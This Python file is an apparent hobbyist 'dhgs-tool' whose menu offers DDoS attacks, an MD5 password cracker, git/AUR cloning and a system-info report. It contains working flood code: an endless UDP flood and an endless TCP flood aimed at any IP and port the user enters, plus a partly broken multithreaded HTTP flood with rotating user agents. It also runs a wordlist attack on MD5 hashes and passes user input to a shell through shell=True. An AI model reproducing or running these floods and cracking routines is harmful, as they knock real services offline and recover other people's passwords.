# By transcrime
# GPL-3.0 license

import platform
import psutil
import socket
import os
import sys
import subprocess
import socketserver
import threading
import requests
import random
import sys
import json
import hashlib
from hmac import digest
# ASCII Art for dhgs-tool 
big_text = """
_░▒███████
░██▓▒░░▒▓██
██▓▒░__░▒▓██___██████
██▓▒░____░▓███▓__░▒▓██
██▓▒░___░▓██▓_____░▒▓██
██▓▒░_______________░▒▓██
_██▓▒░______________░▒▓██
__██▓▒░____________░▒▓██
___██▓▒░__________░▒▓██
____██▓▒░________░▒▓██
_____██▓▒░_____░▒▓██
______██▓▒░__░▒▓██
_______█▓▒░░▒▓██
_________░▒▓██
_______░▒▓██
_____░▒▓██
█▀▄ █░█ █▀▀ █▀ ▄▄ ▀█▀ █▀█ █▀█ █░░
█▄▀ █▀█ █▄█ ▄█ ░░ ░█░ █▄█ █▄█ █▄▄
"""

print(big_text)
# This loads and checked if the uername.json file exists if it does it loads the username if not it creates one
file_path = "username.json"
if os.path.exists(file_path):
  with open(file_path, "r") as f:
    data = json.load(f)
    username = data.get("username", "")
    print(f"Welcome back, {username}!")
else:
  username = input("Enter your username:")
  while username == "": #Simple check to make sure username is not empty because it just be weird 
    print("It seems that your username was empty please re-enter it!")
    username = input("Enter your username:")
  with open(file_path, "w") as f: # Creates the username.json and ready to writes the username into it 
    json.dump({"username": username}, f) # Dumps the username into the json file
  print(f"Thanks, {username}! Your username has been saved")

#The reason why I rewrite this part, it was a long statement of print repeatedly, instead of some big mess I thought I would put all together make it look cleaner
options = {"1.": "DDoS", "2.": "Hasher", "3.": "Git", "4.": "System Info", "5.": "Exit"}
print(options)
choice = input("╰─▸ ")
while choice not in ["1", "2", "3", "4", "5"]: # it checks if the user choice is in 1 to 5 if not will keep asking for a valid option
  print("Invalid choice. Please select a valid option.")
  choice = input("╰─▸ ")
#The reason for adding the condition statement, was to make it look cleaner and generally just smaller
if "1" in choice:
 Denial_of_Service_type = {"1.": "UPD", "2.": "TCP", "3.": "HTTP"} 
 print(Denial_of_Service_type)
 choice = input("╰─▸")
 if "1" in choice: # UDP is working
      #def udp_flood(target_ip, ipport):
      target_ip = input("put in ip --> ")
      ipport = int(input("now put in ip port --> "))
      client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #  Socket.AF_INET IS FOR IPv4, Socket.SOCK_DGRAM IS FOR UDP DATAGRAM BASED, CONNECTIONLESS  
      client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # ALLOWS THE SOCKET TO REUSE A LOCAL ADDRESS (IP AND PORT)
      packet = os.urandom(5024) # THIS GENERATES 5024 REANDOM BYTES
      client.sendto(packet, (target_ip, ipport))
      print("Targeting {target_ip}:{ipport} with UDP packet")
      try:
       while True:
        client.sendto(packet, (target_ip, ipport))
        print(f"Packet sent to {target_ip}:{ipport}")
      except KeyboardInterrupt:
       client.close()
      sys.exit()
 if "2" in choice: 
     target_ip = input("IP --> ")
     ipport = int(input("IP PORT --> "))
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket.SOCK_STREAM SPECIFICALLY THIS SOCKET WILL USE TCP 
     print(f"Start attacking on {target_ip}:{ipport}")
     client.connect((target_ip,ipport))
     client.send(b"\x10" * 5024)
     print(f"sending attack {target_ip}:{ipport}") 

 #for _ in range(5):
     try:
      while True:
       client.send(b"\x10" * 5024)
       print(f"sending attack {target_ip}:{ipport}")
     except KeyboardInterrupt:
      client.close()
      sys.exit()
     except ConnectionResetError:
      print("An existing connection was forcibly closed by the remote host - Most likely done by a firewall or something else")
 if "3" in choice: # Working progress
     
 
     target_url = input("URL -->")
     num_threads = int(input("Threads -->"))
         
     user_agents = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
     ]
     def send_request():
      while True:
       try:
        headers = {"User-Agent": random.choice(user_agents)}

        response = requests.get(target_url, headers=headers)
        print(f"Senting request with {headers}{['User-Agent']}")
       except requests.exceptions.RequestException:
        print("Connection failed.")
 
       for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        thread.start
        print(F"HTTP FLOOD HAS SHART IT {num_threads} ON {target_url}")     
if "2" in choice:
 pass_found=0

 i_hash = input("Enter the hashed password:") # User have to input MD5 hash of the password
 p_doc = input("\nEnter password filename inclvding path:")

 p_file = open(p_doc, 'r') # opens the path to the password file and reads it 

 for word in p_file:
     enc_word = word.encode('utf-8')
     hash_word = hashlib.md5(enc_word.strip())
     digest = hash_word.hexdigest()

     if digest == i_hash:
         print("password found : ", word)
         pass_found=1
         break

 if not pass_found:
     print("password not found")
if "3" in choice:
 repository_type = {"1.": "AUR", "2.": "Git", "3.": "Exit"}    
 print(repository_type)
 choice = input("╰─▸")
 while choice not in ["1", "2", "3"]:
  print("Invalid choice. Please select a valid option.")
  choice = input("╰─▸ ")
 if "1" in choice:
# repo_url is kind of like a prefix, basically just set the website that it clone, but to be honest I probably could have done better than this idea
  repo_url = "https://aur.archlinux.org"
  print("Please add a Repository Name to Started the Git Clone")
  repository_name = input("╰─▸") 
# Arch was a lot easier to work with because the AUR does not use usernames just project names which I prefer
  subprocess.run(["git", "clone", f"{repo_url}/" f"{repository_name}"])
  cd_name_getting = os.path.splitext(repository_name)[0]
  print(cd_name_getting) 
  subprocess.run(f"cd {cd_name_getting} && ls", shell=True)
# makepkg -is it's currently broken when it's used it says there's no pkg file but there is something went wrong I have to go figure it out
  subprocess.run(["makepkg", "-is"])  
 if "2" in choice:

  repo_url = "https://github.com"
# my problem was this one was the usernames and repository names I couldn't find a good way to separate them though I probably could have used split I wasn't sure how to properly do it but it might change it later down the line definitely
  print("Please add Persons Github Name")
  github_name = input("╰─▸")   
  print("Please add a Repository Name to Started the Git Clone:")
  link_input = input("╰─▸")
  subprocess.run(["git", "clone", f"{repo_url}/" f"{github_name}/" f"{link_input}"])
# I have considered trying to make it to automated build but I'm not really sure to do that and I don't want to do it in this project and maybe some separate project 
  cd_name_getting = os.path.splitext(link_input)[0]
  print(cd_name_getting)
 if "3" in choice:
    print("Exiting the program. Goodbye!")
    sys.exit()
if "4" in choice:
     # System info using platform module
 print("System:", platform.system())
 print("Machine:", platform.machine())
 print("Processor:", platform.processor())
 print("OS Version:", platform.version())
 print("Python version:", platform.python_version())

 # CPU info using psutil
 print("CPU cores:", psutil.cpu_count(logical=False))
 print("Logical CPUs:", psutil.cpu_count(logical=True))
 print("CPU usage (%):", psutil.cpu_percent(interval=1))

 # Memory info using psutil
 memory = psutil.virtual_memory()
 print(f"Total Memory: {memory.total / (1024 ** 3):.2f} GB")
 print(f"Used Memory: {memory.used / (1024 ** 3):.2f} GB")
 print(f"Free Memory: {memory.free / (1024 ** 3):.2f} GB")

 # Disk info using psutil
 disk = psutil.disk_usage('/')
 print(f"Total Disk Space: {disk.total / (1024 ** 3):.2f} GB")
 print(f"Used Disk Space: {disk.used / (1024 ** 3):.2f} GB")
 print(f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB")

 # Network info using socket
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 print("Hostname:", hostname)
 print("IP Address:", ip_address)

 # Python runtime info using sys
 print("Python executable:", sys.executable)
 print("Python version:", sys.version)

 print("Platform:", sys.platform)
if "5" in choice:
    print("Exiting the program. Goodbye!")
    sys.exit()
  
  
# but this is very early in rework so some things may be changed including comments please be mindful of that and thank you
